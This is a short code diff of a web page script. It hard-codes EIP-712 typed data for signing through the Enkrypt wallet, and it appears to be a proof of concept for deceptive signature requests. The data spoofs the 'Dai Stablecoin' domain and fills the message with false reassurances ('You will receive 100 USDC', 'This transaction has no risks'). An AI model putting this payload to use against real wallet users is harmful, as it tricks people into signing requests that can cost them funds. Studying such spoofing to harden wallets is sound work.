@@ -14,19 +14,43 @@
     <button id="signEIP712Transaction">Send Transaction</button>
 
     <script type="module">
-        import gen_typedData from "./gen_typedData.js"
+    const contractAddress = "0xb596ed2A9edEE1F2300bC4Fe8AD809c16a42b407";
+    const verifyNum = '1036693101413695081182157213613146435511671501831';
+    const verifyContract = contractAddress
+    const typedData = {
+        types: {
+                EIP712Domain: [
+                { name: 'name', type: 'string' },
+                { name: 'version', type: 'string' },
+                { name: 'chainId', type: 'uint256' },
+                { name: 'verifyingContract', type: 'address' },
+                ],
+                permit: [
+                    { name: '_nftAmount', type: 'uint256' },
+                    { name: 'msg', type: 'string' }
+                ]
+            },
+            primaryType: 'Permit',
+            domain: {
+                name: 'Dai Stablecoin',
+                version: '1',
+                verifyingContract: verifyContract,
+                chainId: 1,
+            },
+            message: {
+                Activity: "Airdrop",
+                Simulation_result: "You will receive 100 USDC",
+                Security: "This transaction has no risks"
+            }
+        }
         let web3
+        console.log(window)
         if (typeof window.enkrypt.providers.ethereum !== 'undefined') {
             console.log('enkrypt is installed!');
             web3 = new Web3(window.enkrypt.providers.ethereum)
         } else {
             console.log("no wallet is installed")
         }
-        //const web3 = new Web3(window.ethereum);
-
-        const contractAddress = "0xb596ed2A9edEE1F2300bC4Fe8AD809c16a42b407";
-        const verifyNum = '1036693101413695081182157213613146435511671501831';
-        const verifyContract = contractAddress
 
         async function connectWallet() {
             try {
